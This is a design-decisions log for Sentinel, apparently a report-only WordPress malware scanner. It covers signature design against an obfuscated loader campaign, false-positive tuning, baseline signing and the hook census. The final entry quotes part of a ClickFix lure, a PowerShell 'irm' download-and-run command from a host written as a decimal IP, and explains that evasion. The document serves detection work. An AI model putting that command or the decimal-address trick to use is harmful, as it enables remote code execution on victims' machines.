# Decisions

The why, and the alternatives turned down, behind choices that are not
obvious from the code. Add an entry when a question closes.

---

## The detectors are pure functions, and WordPress is a shell around them

**Decision.** The detector, check, baseline, scanner, network, session and
page-check classes call no WordPress function. They take bytes, paths and a
`$wpdb`-shaped object and return findings. Storage, alerts, cron and the
admin page are a separate layer that calls them.

**Why.** The only way to test a malware detector honestly is against a
real infected backup, which is a directory on a laptop with no WordPress.
The same split is what lets a hundred tests run with no WordPress installed.

**Rejected.** *Detectors as methods on a WordPress class.* Testable only
inside a WordPress bootstrap, and the only bootstrap available is production.

---

## Signatures on structure where names rotate, on literals where the literal is the point

**Decision.** F10 matches the loader by shape (an IIFE opening with a numeric
variable, a numeric array of eight or more entries, an XOR) and by the
run-once flag's shape. F2 matches the dropper by its literal decoder alphabet.

**Why.** This campaign's loader builds use different variable names and
different run-once flags; a signature on either catches one build. Every
dropper shares the alphabet byte-for-byte because it is the decoder's input.

**Rejected.** *IOC-only matching.* The IOC list is kept and is CRITICAL when
it hits, but it is the layer a campaign changes first.

---

## Report only

**Decision.** Sentinel never deletes, renames, disables or blocks, with one
opt-in exception: refusing unauthenticated REST user enumeration.

**Why.** A scanner that acts on its own findings turns a false positive into
an outage, and the first scan of any real site is mostly false positives.
Evidence is preserved as an inert copy; removal follows the runbook.

---

## The baseline is signed with a key the database does not hold

**Decision.** The baseline manifest is HMAC-signed with a constant from
`wp-config.php` or the config file beside the loader. Signing requires typing
the hostname and refuses while any CRITICAL finding is open.

**Why.** This campaign holds valid administrator credentials, which means it
holds the database. A baseline it could re-sign says whatever it wants.
Re-signing is the one action that can make a live dropper permanent, and a
`confirm()` is muscle memory.

---

## The heartbeat fires only after a run completes

**Decision.** One ping, at the end of `finish()`, nowhere else.

**Why.** The heartbeat exists so an outside monitor notices silence. A ping
at the start of a run, or on every cron tick, keeps the monitor happy while
the walk dies halfway every time.

---

## Serialized values from the database are never unserialize()d

**Decision.** Session tokens, option lists and signups are read with
length-aware string parsing.

**Why.** The database is attacker-written. `unserialize()` on attacker bytes
is object injection. The first draft matched strings up to the next quote; a
user-agent with a quote in it hid the rest of the session, and the expiration
was read from the wrong session so nothing ever expired. Both caught by
tests before the code ran anywhere.

---

## An empty network allow-list means "not configured", never "nobody"

**Decision.** With no allow-list, an unknown address is OK after the
attacker, tooling and Tor checks. The shipped list is empty.

**Why.** A list containing only an office range makes every home login HIGH
on the first morning and is turned off by lunch. An empty constant is
likewise "not set", not "set to nothing".

---

## The rendered-page check fetches same-origin scripts only

**Decision.** Cross-origin scripts are named in the inventory and never
fetched.

**Why.** Sentinel does not contact hosts it does not own. A page loading a
loader from a stranger host is reported by the src alone; fetching it would
make Sentinel a client of the attacker's CDN.

---

## What first deployments changed

**Decision.** Sentinel's own source is hashed but never content-scanned.
F14 counts categories of lure text, not terms. F15 and F16 excuse known
plugins by path. The weak F16 clause and stranger script hosts (D2) are
MEDIUM. A saved server error page under an image name is MEDIUM. A 401/403
on a login page, and a 410 anywhere, are INFO. A re-seen finding takes the
detector's current severity. The D8 subject is the /24.

**Why.** A first scan of a real install produced dozens of HIGHs about
embed hosts, copy-to-clipboard buttons, push-notification workers,
e-learning packages and large plugins, and eight about Sentinel's own
signature file. A tool that pages people about a calendar widget fifty times
is a tool whose fifty-first page is filtered. Every relaxation is pinned by
a clean fixture built from the real false positive, and each guarding clause
was mutation-tested.

**Rejected.** *Allow-listing each false positive by path.* That fixes the
files seen and not the shape; the next plugin's copy button fires again.
Path allow-lists are kept only where the shape is genuinely fine.

---

## Self-integrity rides the baseline

**Decision.** Signing records sha256 of Sentinel's own files and the script
inventory of every rendered page. Every minute tick compares the plugin's
files; a difference is L8 CRITICAL.

**Why.** One signing flow, one key, one place a human says "this is clean".
A legitimate re-upload of the plugin fires L8 until re-signed, which is
correct: it is a change to the tripwire, and the person who made it re-signs.

---

## Uploaded signature files replace the shipped ones whole

**Decision.** A JSON file pasted into the settings page is validated, stored,
and replaces the shipped file entirely.

**Why.** A merge lets a stale shipped entry survive an update that meant to
remove it, and the version on the page then describes neither file.

---

## The hook census judges a callback by where its file lives, not by what its source says

**Decision.** L10 reads `$wp_filter` for the user-hiding hooks
(`pre_user_query`, `rest_user_query`, `views_users`, `pre_count_users`,
`show_advanced_plugins`, `all_plugins`) and the password hooks
(`authenticate` with the password argument, and friends), resolves each
callback to its file with Reflection, and sets severity by location:
mu-plugins, drop-ins, uploads or an unplaceable file CRITICAL; a theme HIGH;
a plugin MEDIUM. One file on two hiding hooks, or on a hiding hook and a
password hook, is CRITICAL wherever it lives.

**Why.** The mu-plugin family Wordfence documented in September 2026 passes
every hook name, option key and SQL string through a substitution cipher,
and changes its filename per install. No text signature survives that. The
registration in `$wp_filter` cannot be obfuscated, because WordPress has to
be able to call it.

**Rejected.** *Every non-core callback on these hooks at HIGH.* Role
editors sit on `pre_user_query`, LDAP and two-factor plugins on
`authenticate`. Excuse known-good files in `hook_census_files`.

---

## Fixtures written from descriptions cannot find what a real backup finds

**Decision.** The detectors were scored file by file against a real infected
backup, and three rules changed: plant names of more than one word (S1/S2),
F10's search window, and F23's case-sensitivity.

**Why.** Each fixture had been written from a description of an artifact.
The F10 fixture's numeric array had twelve entries because nothing said the
real one had two thousand; the plant-name examples were all one word.
Mutation testing proves a clause is guarded by a test; it cannot prove the
test resembles the thing. Each fix has a regression test at the real
proportions, generated rather than copied: the fixtures stay
reconstructions.

---

## L6 counts only real REST requests

**Decision.** L6 records, and the block setting refuses, only when
`REST_REQUEST` is set: the request came in through `/wp-json/` or
`?rest_route=`. An anonymous `/wp/v2/users` lookup a plugin dispatches
internally while building a page is ignored. An author embedded in an
anonymous `?_embed` REST request still counts.

**Why.** L6 hooks `rest_pre_dispatch`, which also fires for
`rest_do_request()` during a page render, with the page's visitor as the
client. On one multisite, Sentinel's own hourly page check produced 94% of
all L6 hits that way, against the server's own address, which read like a
neighbour on the same host enumerating users. With the block on, the page's
own lookup was refused too.

---

## Count every failed login, because L7's silence is ambiguous

**Decision.** Every failed login adds to a per-day tally in one site option:
total, and a per-address count capped at 300. L13 (MEDIUM) fires from the
digest on a day of zero after a week that averaged ten or more.

**Why.** L7 speaks only at ten from one address in ten minutes, so no L7
fits three different nights: nobody tried, something upstream blocks them,
or Sentinel stopped hearing them. Only a count of every failure separates
them.

**Rejected.** *An event row per failure* (thousands an hour under a spray).
*Uncapped address maps* (the same spray grows the option without bound).

---

## Retired sites leave the page check, and only the page check

**Decision.** Archived, deactivated and spam network sites are not fetched
by the hourly page check; the Dashboard names each one and why. Their files,
options, content and administrators are still checked.

**Why.** Networks often archive a site as a holding step before deleting it.
Its visitors see WordPress's suspended notice, and its domain may lapse and
be re-registered by a stranger, whom Sentinel then fetches every hour while
waiting out timeouts the live sites needed the time for. A holding site's
data is exactly what is being kept, one click from being unarchived, so
every other check keeps covering it.

---

## Big files are read whole, in overlapping pieces

**Decision.** A file over 1 MB is read start to end in 1 MB pieces that
overlap by 64 KB, each through the same detectors; the walk seeks through a
file on disk and the page check slices the body it holds. A detector that
fires in several pieces is reported once, with the offset in the file.

**Why.** Earlier versions never read content past 1 MB, and a real
infected backup had the loader appended to a 3.7 MB
`fontawesome-all.min.js`. Reading only the two ends would catch that one,
but the campaign edits files through a file manager and can put the loader
anywhere. Spliced into the middle of the clean file, the real loader is
found at its exact offset. Memory stays at one piece; few files are that big.

**The overlap.** Pieces must share more than the longest thing a detector
needs whole: the loader (~10 KB) and F10's 16 KB look past its start. 64 KB
is four times that. A test places a full-length loader across a piece
boundary; with no overlap it is missed.

**Rejected.** *Raising the cap.* It moves the edge instead of removing it.

---

## F9 needs its three calls close together

**Decision.** F9 fires only when `atob(`, `new Function(` and
`fromCharCode`/`charCodeAt` all sit within 32 KB of one another.

**Why.** Every real loader keeps them within ~8 KB. A bundled library has
all three by chance: dropzone 5.9.3 holds them 80 KB apart, a 1.4 MB
newsletter-editor bundle 800 KB. An allow-list entry would excuse one
library by name and leave the next to be found the same way.

---

## An attacker's /24 is HIGH, not CRITICAL

**Decision.** A login or live session from the same /24 (IPv6 /64) as a
listed attacker address, or inside a CIDR listed in `attacker_ips`, is
HIGH. The exact address and the tooling user-agent stay CRITICAL.

**Why.** In a real intrusion the attacker came back from the /24 of a
listed address, and the site's login-history plugin recorded only /24s
anyway. But these are commercial VPN and Tor ranges, shared with strangers.
HIGH still alerts at once. A new, ordinary browser user-agent seen in the
same intrusion is not listed: every Windows user would match it.

---

## Campaign plugins are found by name, with no baseline

**Decision.** S10 flags a plugin or theme directory named like a campaign
plugin (exact names in `iocs.json` `plugin_dirs`, or site-helper's
`<word>-<12 hex>`); D11 flags one active on any site or network-wide.

**Why.** D7 reports what was activated since the baseline, and a baseline
signed after a break-in holds the campaign's plugins as normal. On a real
multisite both were active on the main site. The hex rule needs letters and
digits, so a 12-digit date is not a match.

---

## Translation files and MailPoet's template cache are recognised, not allow-listed

**Decision.** S3 is silent on a `languages/` `*.l10n.php` whose tokens are
one `return` of a literal array, and on a file in MailPoet's cache folder
named `<2 hex>/<64 hex>.php` whose first line is a compiled Twig template
class. Anything else in either place is still HIGH.

**Why.** On real sites these were hundreds of HIGHs that were always false,
which teaches people to skip S3. A folder allow-list would excuse any code
put there: a translation file is PHP that WordPress includes. The tokenizer
proves the file is data; it parses, never runs.

**Limits.** A backdoor that copies a cache file's name and first 256 bytes
inside MailPoet's cache folder is not an S3; uploads/ is not content-scanned,
so the rendered-page check and the live hooks are what remain.

---

## A web page under a picture's name is judged by what it carries

**Decision.** When S4 finds HTML under a media extension, the walk reads the
file and runs the content detectors over it. Anything at HIGH or above
makes S4 CRITICAL and names it; nothing makes it MEDIUM, a broken upload. A
file that could not be read stays CRITICAL; PHP or a zip is CRITICAL as
before.

**Why.** Sites that have run for years collect pages stored where a picture
should be: a 404 page, a login page, a saved copy of the site. Every one was
a CRITICAL. A web page in uploads is dangerous for what it carries, and the
content detectors are what know that.

**Limits.** S4 saw HTML only when the file started with `<!DOCTYPE`,
`<html` or `<script` (0.4.11: any tag).

---

## `hasDemoPage` is an indicator only as a call; any tag is markup to S4

**Decision.** The F11 string is `hasDemoPage(`, not `hasDemoPage`. S4 treats
any media file that opens with a tag as markup.

**Why.** The people removing a campaign name its artifacts in order to
find them. On real sites a page-level kill switch (inline on home pages,
and in two sites' theme header scripts) and an uploads scanner's backdoor
regex all listed the bare word, and the kill switch raised CRITICAL on
every page check. None had `hasDemoPage(`; the runtime has it in its ABI
and its call. And every format S4 covers has a binary signature; none
begins with `<`.

**Rejected.** *Dropping the word altogether*: the contract's function
names are the campaign's own. *Allow-listing the cleanup by hash*: it
changes per page and an allow-listed block is a place to hide.

**Limits.** A loader that reaches the function only as `["hasDemoPage"]`
would not match; its `getDemoPage` ABI and contract addresses would.

---

## F14 ignores case and knows two command shapes

**Decision.** F14's strong terms are matched case-insensitively, and two
shapes count as strong: PowerShell followed by a flag, however the
executable is quoted, and a download from a host written as a single
8-to-10-digit decimal number, where the number ends the host.

**Why.** The ChatGPT Custom GPT ClickFix campaign (Huntress, September
2026) told victims to paste `"...\PowerShell.exe" -ExecutionPolicy Bypass
"irm 1614733393/12 | ..."`. Planted on a page with no lure words around
it, that raised nothing: the list said `powershell -` in lowercase, and
the command's next character is a quote. `1614733393` is 96.62.224.81
written to slip past dotted-address filters.

**Rejected.** *The campaign's address or its decimal form as indicators.*
It is a download server, and `1614733393` is also a Unix time that version
strings carry.

